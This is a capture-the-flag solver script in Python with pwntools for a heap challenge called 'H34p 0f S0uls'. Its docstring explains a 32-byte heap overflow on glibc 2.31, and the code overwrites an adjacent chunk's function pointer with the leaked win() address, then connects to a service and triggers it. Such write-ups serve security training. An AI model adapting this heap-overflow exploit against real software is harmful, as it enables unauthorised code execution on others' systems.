#!/usr/bin/env python3
"""
H34p 0f S0uls — Solver
Author: H3xPh4r04h

Exploitation: Tcache poisoning via heap overflow

Target: Ubuntu 20.04 (glibc 2.31) — tcache has no key/pointer mangling

Vulnerability: edit_soul() allows writing SOUL_SIZE + 0x20 (136 bytes)
into a buffer of SOUL_SIZE (104 bytes) = 32 byte overflow into next chunk.

struct SoulVessel {
    void (*ritual)(void);    // offset 0x00 — function pointer (8 bytes)
    char essence[0x68];      // offset 0x08 — name buffer (104 bytes)
};                           // total: 112 bytes -> malloc(112) -> chunk size 0x80

Exploitation steps:
1. Allocate soul A (idx 0) and soul B (idx 1) — adjacent on heap
2. Free soul B (goes into tcache for size 0x80)
3. Edit soul A — overflow into freed soul B's chunk metadata
   - Overwrite B's tcache fd pointer to point at soul A's struct (specifically
     at offset 0 where the function pointer lives)
   - Or better: point it at a controlled location where we write win() addr
4. Allocate soul C (gets the real free chunk — B's old location)
5. Allocate soul D (gets our poisoned address — the forged chunk)
6. We now have arbitrary write at the forged address
7. Write win() address where a function pointer will be called
8. Call perform_ritual on the forged soul

Alternative simpler approach for glibc 2.31:
- Since PIE is disabled, win() is at a fixed address
- Overflow from soul A directly into adjacent soul B's ritual function pointer
- The struct layout: [ritual_ptr(8)] [essence(104)] | next chunk...
- If we overflow from A's essence, we go past A's chunk into B's chunk
- B's chunk header is 16 bytes (prev_size + size), then B's ritual ptr is next
- So overflow: 104 bytes (fill A's essence) is within bounds...
  Wait — edit writes into essence which starts at offset 8 of the struct.
  The chunk layout:
    [chunk_hdr 16][ritual_ptr 8][essence 104] = chunk of 128 bytes (0x80 + metadata)
  So writing 136 bytes into essence (104 + 32 overflow):
    - 104 bytes fill essence
    - 8 bytes overwrite next chunk's prev_size
    - 8 bytes overwrite next chunk's size
    - 16 bytes overflow into next chunk's data (which is the ritual ptr + start of essence)

  So if B is allocated right after A:
    overflow from A's edit: 104 bytes (A's essence) + 8 (B's prev_size) + 8 (B's size) + 8 (B's ritual ptr)
    = 128 bytes needed. We have 136 bytes of write. EXACTLY enough to overwrite B's ritual ptr!

  Payload: b'A' * 104 + p64(0) + p64(0x81) + p64(win_addr)
  Then call perform_ritual on soul B.

This is the DIRECT heap overflow approach — simpler and more reliable.
"""
import sys
from struct import pack

p64 = lambda x: pack("<Q", x)

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

try:
    from pwn import remote, context, p64, u64
    context.log_level = "info"

    r = remote(HOST, PORT)

    def cmd(n):
        r.recvuntil(b">>>")
        r.sendline(str(n).encode())

    def collect(name):
        cmd(1)
        r.recvuntil(b"s0ul: ")
        r.sendline(name)

    def release(idx):
        cmd(2)
        r.recvuntil(b"]: ")
        r.sendline(str(idx).encode())

    def view(idx):
        cmd(3)
        r.recvuntil(b"]: ")
        r.sendline(str(idx).encode())
        return r.recvline()

    def edit(idx, data):
        cmd(4)
        r.recvuntil(b"]: ")
        r.sendline(str(idx).encode())
        r.recvuntil(b"p0w3r): ")
        r.send(data)

    def ritual(idx):
        cmd(5)
        r.recvuntil(b"]: ")
        r.sendline(str(idx).encode())

    def necro_info():
        cmd(6)
        r.recvuntil(b"w1n() = ")
        win_addr = int(r.recvline().strip(), 16)
        r.recvuntil(b"n0t_th3_w1n() = ")
        not_win = int(r.recvline().strip(), 16)
        return win_addr, not_win

    # Step 1: Leak win() address
    win_addr, _ = necro_info()
    print(f"[*] win() @ {hex(win_addr)}")

    # Step 2: Allocate two adjacent souls
    collect(b"AAAA")  # idx 0 (soul A)
    collect(b"BBBB")  # idx 1 (soul B)

    # Step 3: Overflow from soul A into soul B
    # Layout: [A's essence: 104 bytes][B's prev_size: 8][B's size: 8][B's ritual_ptr: 8]
    payload = b"X" * 104          # fill A's essence completely
    payload += p64(0)             # B's prev_size (keep 0)
    payload += p64(0x81)          # B's size (must stay valid: 0x80 + PREV_INUSE bit)
    payload += p64(win_addr)      # overwrite B's ritual function pointer with win()

    edit(0, payload)
    print(f"[*] Overflow sent, B's ritual ptr overwritten with win()")

    # Step 4: Call ritual on soul B -> calls win()
    ritual(1)

    # Get flag
    r.interactive()

except ImportError:
    print("Install pwntools: pip install pwntools")
    sys.exit(1)
